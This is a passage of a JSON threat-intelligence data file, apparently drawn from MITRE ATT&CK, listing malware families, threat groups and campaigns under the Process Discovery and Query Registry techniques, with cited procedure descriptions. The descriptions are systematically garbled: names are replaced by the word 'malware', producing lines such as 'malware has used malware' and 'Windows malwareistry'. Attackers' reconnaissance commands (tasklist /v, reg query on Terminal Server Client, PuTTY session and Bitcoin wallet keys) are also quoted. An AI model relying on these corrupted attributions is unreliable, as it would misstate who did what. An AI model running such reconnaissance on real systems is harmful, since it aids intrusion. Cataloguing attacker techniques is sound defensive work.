                "Description": "malware has used malware to obtain a list of running processes on the system.[184][185]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has used tasklist /v to determine active process information.[186]"
            },
            "S0247": {
                "ID": "S0247",
                "Name": "NavRAT",
                "Description": "malware uses tasklist /v to check running processes.[187]"
            },
            "S0630": {
                "ID": "S0630",
                "Name": "Nebulae",
                "Description": "malware can enumerate processes on a target system.[188]"
            },
            "S0034": {
                "ID": "S0034",
                "Name": "NETEAGLE",
                "Description": "malware can send process listings over the C2 channel.[29]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can discover processes on compromised hosts.[189]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware has the ability to use GetWindowThreadProcessId to identify the process behind a specified window.[190]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware can enumerate processes on a targeted host.[191][192]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can search a list of running processes for Tr.exe.[193]"
            },
            "S1107": {
                "ID": "S1107",
                "Name": "NKAbuse",
                "Description": "malware will check victim systems to ensure only one copy of the malware is running.[194]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware can check for blocklisted process names on a compromised host.[195]"
            },
            "S0346": {
                "ID": "S0346",
                "Name": "OceanSalt",
                "Description": "malware can collect the name and ID for every process running on the system.[196]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has run tasklist on a victim's machine.[197]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the tasklist command as part of their advanced reconnaissance.[198]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors obtained a list of running processes on a victim machine using cmd /c tasklist > %temp%\\temp.ini.[199]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, the threat actors used tasklist to collect a list of running processes on an infected system.[200]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can gather a process list from the victim.[201]"
            },
            "S1017": {
                "ID": "S1017",
                "Name": "OutSteel",
                "Description": "malware can identify running processes on a compromised host.[202]"
            },
            "S0626": {
                "ID": "S0626",
                "Name": "P8RAT",
                "Description": "malware can check for specific processes associated with virtual environments.[203]"
            },
            "S0664": {
                "ID": "S0664",
                "Name": "Pandora",
                "Description": "malware can monitor processes on a compromised host.[204]"
            },
            "S0208": {
                "ID": "S0208",
                "Name": "Pasam",
                "Description": "malware creates a backdoor through which remote attackers can retrieve lists of running processes.[205]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can obtain a list of running processes on a compromised host.[114]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware can iterate through running processes every six seconds collecting a list of processes to capture from later.[206]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware can iterate over the running processes to find a suitable injection target.[207]"
            },
            "S0254": {
                "ID": "S0254",
                "Name": "PLAINTEE",
                "Description": "malware performs the tasklist command to list running processes.[208]"
            },
            "S0435": {
                "ID": "S0435",
                "Name": "PLEAD",
                "Description": "malware has the ability to list processes on the compromised host.[209]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware has a module to list the processes running on a machine.[210]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has the ability to list all running processes.[211]"
            },
            "S0216": {
                "ID": "S0216",
                "Name": "POORAIM",
                "Description": "malware can enumerate processes.[212]"
            },
            "G0033": {
                "ID": "G0033",
                "Name": "Poseidon Group",
                "Description": "After compromising a victim, malware lists all running processes.[213]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has a command to list the victim's processes.[214]"
            },
            "S0441": {
                "ID": "S0441",
                "Name": "PowerShower",
                "Description": "malware has the ability to deploy a reconnaissance module to retrieve a list of the active processes.[215]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware's Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.[216][217]"
            },
            "S0393": {
                "ID": "S0393",
                "Name": "PowerStallion",
                "Description": "malware has been used to monitor process lists.[218]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware has used get_tasklist to discover processes on the compromised host.[219]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may collect process information by running tasklist on a victim.[220]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware lists processes running on the system.[162]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can list the running processes and get the process ID and parent process\u2019s ID.[221]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware has the ability to check running processes.[222]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can enumerate processes on a target system.[188]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can gather a list of running processes by using Tasklist.[223]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware lists the system\u2019s processes.[224][225]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can identify processes based on PID.[226]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware can obtain a process list from the victim.[227]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware can enumerate all running processes and process information on an infected machine.[228]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware can detect a running process's PID on the infected machine.[229]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.[230]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can list the current running processes on the system.[231][232]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "malware can monitor the /proc/[PID] directory of known malware processes as a part of its persistence when executing with non-root permissions. If the process is found dead, it resurrects the process. malware processes can be matched to an associated Advisory Lock, in the /proc/locks folder, to ensure it doesn't spawn more than one process.[233]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can use GetCurrentProcess to enumerate processes.[234]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can obtain information about process integrity levels.[235]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has called CreateToolhelp32Snapshot to enumerate all running processes.[236]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware has enumerated running processes on a compromised host to determine if it is running under the process name dfrgui.exe.[202]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to execute the tasklist command.[237]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware can enumerate a list of running processes on a compromised machine.[238]"
            },
            "S0345": {
                "ID": "S0345",
                "Name": "Seasalt",
                "Description": "malware has a command to perform a process listing.[35]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has collected the PID of a malicious process.[239]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware listed all running processes on the machine.[240]"
            },
            "S0063": {
                "ID": "S0063",
                "Name": "SHOTPUT",
                "Description": "malware has a command to obtain a process listing.[241]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used tools to identify running processes on the victim's machine.[242]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded.[243]"
            },
            "S0468": {
                "ID": "S0468",
                "Name": "Skidmap",
                "Description": "malware has monitored critical processes to ensure resiliency.[244]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has enumerated processes by ID, name, or privileges.[245]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware can list processes on targeted hosts.[246]"
            },
            "S0273": {
                "ID": "S0273",
                "Name": "Socksbot",
                "Description": "malware can list all running processes.[247]"
            },
            "S0627": {
                "ID": "S0627",
                "Name": "SodaMaster",
                "Description": "malware can search a list of running processes.[203]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used multiple command-line utilities to enumerate running processes.[248][249][250]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can use the getprocesslist command to enumerate processes on a compromised host.[251][127][252]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware can enumerate processes on a victim machine through use of Tasklist.[253]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware gathers a list of running processes.[254]"
            },
            "S0142": {
                "ID": "S0142",
                "Name": "StreamEx",
                "Description": "malware has the ability to enumerate processes.[255]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware can determine if a user is logged in by checking to see if explorer.exe is running.[256]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.[257]"
            },
            "S0562": {
                "ID": "S0562",
                "Name": "SUNSPOT",
                "Description": "malware monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525. It also extracted command-line arguments and individual arguments from the running MsBuild.exe process to identify the directory path of the Orion software Visual Studio solution.[258]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can collect a list of running processes from an infected host.[259]"
            },
            "S0018": {
                "ID": "S0018",
                "Name": "Sykipot",
                "Description": "malware may gather a list of running processes by running tasklist /v.[260]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware enumerates all running processes.[261][262]"
            },
            "S0464": {
                "ID": "S0464",
                "Name": "SYSCON",
                "Description": "malware has the ability to use Tasklist to list running processes.[263]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can collect information about running processes.[264]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware can use GetCurrentProcessId for process discovery.[265]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "malware can execute ProcessList for process discovery.[266]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to identify running processes and associated plugins on an infected host.[267]"
            },
            "S0057": {
                "ID": "S0057",
                "Name": "Tasklist",
                "Description": "malware can be used to discover processes running on a system.[268]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has searched for rival malware and removes it if found.[269] malware has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.[270]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware obtains a list of running processes using the function kill_unwanted.[271]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has run cmd /c start /b tasklist to enumerate processes.[192]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware uses module networkDll for process list discovery.[272][273]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can use Tasklist to collect a list of running tasks.[28][274]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware is capable of enumerating the running processes on the system using pslist.[275][276]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware has the ability to list processes on the infected host.[277]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover running processes using the tasklist /v command.[102] malware RPC backdoors have also enumerated processes associated with specific open ports or named pipes.[218]"
            },
            "S0333": {
                "ID": "S0333",
                "Name": "UBoatRAT",
                "Description": "malware can list running processes on the system.[278]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can use its Process List command to enumerate processes on compromised hosts.[279]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has gathered information about running processes.[280][281]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can use tasklist to gather information about the process running on the infected system.[276]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has the ability to enumerate running processes on a compromised host.[282]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware can get a list of the processes and running tasks on the system.[283]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware can gather a list of processes.[284]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has enumerated running processes on targeted systems.[285][286]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can obtain a list of processes on a compromised host.[287]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware can identify the process for a specific security product.[288]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used malware to enumerate active processes.[289]"
            },
            "S0219": {
                "ID": "S0219",
                "Name": "WINERACK",
                "Description": "malware can enumerate processes.[212]"
            },
            "S0059": {
                "ID": "S0059",
                "Name": "WinMM",
                "Description": "malware sets a WH_CBT Windows hook to collect information on process creation.[290]"
            },
            "S0141": {
                "ID": "S0141",
                "Name": "Winnti for Windows",
                "Description": "malware can check if the explorer.exe process is responsible for calling its install function.[291]"
            },
            "G0044": {
                "ID": "G0044",
                "Name": "Winnti Group",
                "Description": "malware looked for a specific process running on infected servers.[292]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can call NtQuerySystemProcessInformation with SystemProcessInformation to enumerate all running processes, including associated information such as PID, parent PID, image name, and owner.[293]"
            },
            "S0161": {
                "ID": "S0161",
                "Name": "XAgentOSX",
                "Description": "malware contains the getProcessList function to run ps aux to get running processes.[294]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware gets an output of running processes using the tasklist command.[295]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware uses the tasklist and wmic process get Capture, ExecutablePath commands to gather the processes running on the system.[53][296][54][297][298]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware checks for running processes on the victim\u2019s machine.[299]"
            },
            "S1114": {
                "ID": "S1114",
                "Name": "ZIPLINE",
                "Description": "malware can identify running processes and their names.[300]"
            },
            "S0672": {
                "ID": "S0672",
                "Name": "Zox",
                "Description": "malware has the ability to list processes.[301]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware has a command, ps, to obtain a listing of processes on the system.[302]"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware has created a snapshot of running processes using CreateToolhelp32Snapshot.[303]"
            }
        }
    },
    "T1012": {
        "ttp_name": "Query Registry",
        "ttp_id": "T1012",
        "href": "/techniques/T1012",
        "tactic": "Discovery",
        "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security.[1] Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
        "Procedure": {
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware can enumerate registry keys.[2][3]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware's backdoor can query the Windows Registry to gather system information. [4]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used various strains of malware to query the Registry.[5]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware queried registry values to determine items such as configured RDP ports and network configurations.[6]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware has opened the registry and performed query searches.[7]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can check for installed software on the system under the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall.[8]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has executed the reg query command for HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default.[9]"
            },
            "S0031": {
                "ID": "S0031",
                "Name": "BACKSPACE",
                "Description": "malware is capable of enumerating and making modifications to an infected system's Registry.[10]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware searches for certain Registry keys to be configured before executing the payload.[11]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can query Windows\\CurrentVersion\\Uninstall for installed applications.[12][13]"
            },
            "S0574": {
                "ID": "S0574",
                "Name": "BendyBear",
                "Description": "malware can query the host's Registry key at HKEY_CURRENT_USER\\Console\\QuickEdit to retrieve data.[14]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has used the RegQueryValueExA function to retrieve proxy information in the Registry.[15]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware can use the RegEnumKeyW to iterate through Registry keys.[16]"
            },
            "S0252": {
                "ID": "S0252",
                "Name": "Brave Prince",
                "Description": "malware gathers information about the Registry.[17]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can check the Registry for specific keys.[18]"
            },
            "S0030": {
                "ID": "S0030",
                "Name": "Carbanak",
                "Description": "malware checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information.[19]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has searched the Image File Execution Options registry key for \"Debugger\" within every subkey.[20]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware enumerates values in the Registry.[21]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware contains watchdog functionality that periodically ensures HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load is set to point to its executable.[22]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware has the ability to enumerate Uninstall registry values.[23]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has queried Registry keys using reg query \\\\HKU\\\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\\\HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.[24]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "malware provides access to the Windows Registry, which can be used to gather information.[25]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware has the ability to enumerate Registry keys, including KEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir to search for a bitcoin wallet.[26][27]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can query HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\  to determine if the security setting for restricting default programmatic access is enabled.[28][29]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware can check the default browser by querying HKCR\\http\\shell\\open\\command.[30]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can check the Registry for the presence of HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate to determine how long it has been installed on a host.[31]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can query the Registry to determine if it has already been installed on the system.[32]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware queries the Registry for keys and values.[33]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware is capable of enumerating Registry keys and values.[34]"
            },
            "S0186": {
                "ID": "S0186",
                "Name": "DownPaper",
                "Description": "malware searches and reads the value of the Windows Update Registry Run key.[35]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has queried the Registry to identify victim information.[36]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.[37]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware uses the rem reg query command to obtain values from Registry keys.[38]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can get user agent strings for the default browser from HKCU\\Software\\Classes\\http\\shell\\open\\command.[39]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware queries the Registry for specific keys for potential privilege escalation and proxy information. malware has also used WMI to query the Windows Registry.[40][41]"
            },
            "S0182": {
                "ID": "S0182",
                "Name": "FinFisher",
                "Description": "malware queries Registry values as part of its anti-sandbox checks.[42][43]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has accessed Registry hives ntuser.dat and UserClass.dat.[44]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can check Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings to extract the ProxyServer string.[45]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can open random files and Registry keys to obscure malware behavior from sandbox analysis.[46]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has checked for the existence of a Service key to determine if it has already been installed on the system.[47]"
            },
            "S0249": {
                "ID": "S0249",
                "Name": "Gold Dragon",
                "Description": "malware enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[17]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "A variant of malware hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key SYSTEM\\CurrentControlSet\\Control\\Lsa Name.[48]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.[49][50]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware has a data wiper component that enumerates keys in the Registry HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services.[51]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can enumerate Registry values, keys, and data.[52]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can enumerate Registry keys.[53]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has obtained specific Registry keys and values on a compromised host.[54]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another malware malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.[55][56][57]"
            },
            "S0513": {
                "ID": "S0513",
                "Name": "LiteDuke",
                "Description": "malware can query the Registry to check for the presence of HKCU\\Software\\KasperskyLab.[39]"
            },
            "S0680": {
                "ID": "S0680",
                "Name": "LitePower",
                "Description": "malware can query the Registry for keys added to execute COM hijacking.[58]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can check for existing stratum cryptomining information in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr \u2013 %stratum info%.[59]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can enumerate Registry keys with all subkeys and values.[60]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware can query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid to retrieve the machine GUID.[61]"
            },
            "S1047": {
                "ID": "S1047",
                "Name": "Mori",
                "Description": "malware can read data from the Registry including from HKLM\\Software\\NFC\\IPA andHKLM\\Software\\NFC\\.[62]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can read specific registry values.[63]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" on a victim to query the Registry.[64]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, the threat actors executed /c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\ to detect recent PuTTY sessions, likely to further lateral movement.[65]"
            },
            "S0165": {
                "ID": "S0165",
                "Name": "OSInfo",
                "Description": "malware queries the registry to look for information about Terminal Services.[66]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can search the registry files of a compromised host.[45]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware has used shellcode which reads code stored in the registry keys \\REGISTRY\\SOFTWARE\\Microsoft\\DRM using the native Windows API as well as read HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces as part of its C2.[67]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware can enumerate and query for information contained within the Windows Registry.[68][69]"
            },
            "S0145": {
                "ID": "S0145",
                "Name": "POWERSOURCE",
                "Description": "malware queries Registry keys in preparation for setting Run keys to achieve persistence.[70]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.[71][72]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may query the Registry by running reg query on a victim.[73]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.[74]"
            },
            "S0269": {
                "ID": "S0269",
                "Name": "QUADAGENT",
                "Description": "malware checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.[75]"
            },
            "S1076": {
                "ID": "S1076",
                "Name": "QUIETCANARY",
                "Description": "malware has the ability to retrieve information from the Registry.[76]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware uses the command reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings\".[77]"
            },
            "S0172": {
                "ID": "S0172",
                "Name": "Reaver",
                "Description": "malware queries the Registry to determine the correct Startup path to use for persistence.[78]"
            },
            "S0075": {
                "ID": "S0075",
                "Name": "Reg",
                "Description": "malware may be used to gather details from the Windows malwareistry of a local or remote system at the command-line interface.[79]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can query the Registry to get random file extensions to append to encrypted files.[80]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware has identified the OS product name from a compromised host by searching the registry for SOFTWARE\\MICROSOFT\\Windows NT\\ CurrentVersion | ProductName.[81]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can access the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.[82]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware has used check_registry_keys as part of its environmental checks.[83]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware can query SOFTWARE\\Microsoft\\.NETFramework\\policy\\v2.0 for discovery.[84]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware queries several Registry keys to identify hard disk partitions to overwrite.[85]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware can query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid to retrieve the machine GUID.[61]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware has queried the registry for proxy server information.[86]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
